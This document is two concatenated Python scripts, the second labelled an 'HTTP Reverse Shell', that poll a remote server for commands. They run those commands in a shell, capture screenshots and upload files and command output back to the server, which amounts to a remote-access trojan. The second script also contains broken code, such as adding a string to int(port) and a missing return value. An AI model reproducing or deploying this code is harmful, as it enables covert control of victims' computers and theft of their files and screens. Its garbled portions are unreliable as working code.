import os
import time
import tempfile
import requests
import subprocess
import argparse
from PIL import ImageGrab

def upload_file(url, filepath):
    """Uploads a file to the specified URL."""
    try:
        with open(filepath, 'rb') as file:
            response = requests.post(url, files={'file': file})
            if response.status_code == 200:
                print(f"File uploaded successfully: {filepath}")
            else:
                print(f"Failed to upload {filepath}: {response.status_code}")
    except Exception as e:
        print(f"Error uploading file: {e}")

def capture_screenshot(url):
    """Captures a screenshot and uploads it to the specified URL."""
    with tempfile.TemporaryDirectory() as dirpath:
        screenshot_path = os.path.join(dirpath, "img.jpg")
        ImageGrab.grab().save(screenshot_path, "JPEG")
        upload_file(url, screenshot_path)

def execute_command(command, url):
    """Executes a shell command and uploads its output."""
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    if stdout:
        requests.post(url, data=stdout)
    if stderr:
        requests.post(url, data=stderr)

def main(base_url):
    while True:
        try:
            req = requests.get(base_url)
            command = req.text.strip()

            if 'terminate' in command:
                break

            elif 'grab' in command:
                _, path = command.split('*')
                if os.path.exists(path):
                    upload_file(f"{base_url}/store", path)
                else:
                    requests.post(base_url, data='[-] Not able to find the file!')

            elif 'screencap' in command:
                capture_screenshot(f"{base_url}/store")

            else:
                execute_command(command, base_url)

            time.sleep(3)

        except Exception as e:
            print(f"An error occurred: {e}")
            time.sleep(3)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="File grabber and screenshot taker.")
    parser.add_argument("--url", type=str, default="http://10.10.10.100", help="Base URL to connect to.")
    
    args = parser.parse_args()
    main(args.url)
import argparse
import sys
import os
import time
from PIL import ImageGrab
import tempfile
import requests
import subprocess


def parse_arguments():
    parser = argparse.ArgumentParser(description="HTTP Reverse Shell")
    parser.add_argument("host", help="Hostname or ip of Server")
    parser.add_argument("port", help="Serever Port")


def uploadFile(url, directory):
    try:
        with open(directory, "rb") as file:
            response = requests.post(url, files={"file": file})
            if response.status_code == "200":
                print("[+] File Uploaded Successfully")
            else:
                print("[-] Failed to upload File")
    except Exception as e:
        sys.stderr.write("[~] Error: {}".format(str(e)))


def screenCapture(url):
    with tempfile.TemporaryDirectory() as dirpath:
        screenshotPath = os.path.join(dirpath, "img.jpg")
        ImageGrab.grab().save(screenshotPath, "JPEG")
        uploadFile(url, screenshotPath)


def executeCommand(command, url):
    process = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    output, error = process.communicate()
    if output:
        requests.post(url, data=output)
    elif error:
        requests.post(url, data=error)


def connect(host, port):
    if host and port:
        url = "http://" + host + int(port)
        while True:
            response = requests.get(url)
            command = response.text.strip()
            if "exit" in command:
                break
            elif "grab" in command:
                _, directory = command.split(" ", 1)
                if os.path.exists(directory):
                    uploadFile(url, directory)
                else:
                    requests.post(url, data="[-] Not able to find file")
            elif "screencap" in command:
                screenCapture(url)
            else:
                executeCommand(command, url)

            time.sleep(3)


def main():
    args = parse_arguments()
    connect(args.host, args.port)


if __name__ == "__main__":
    main()
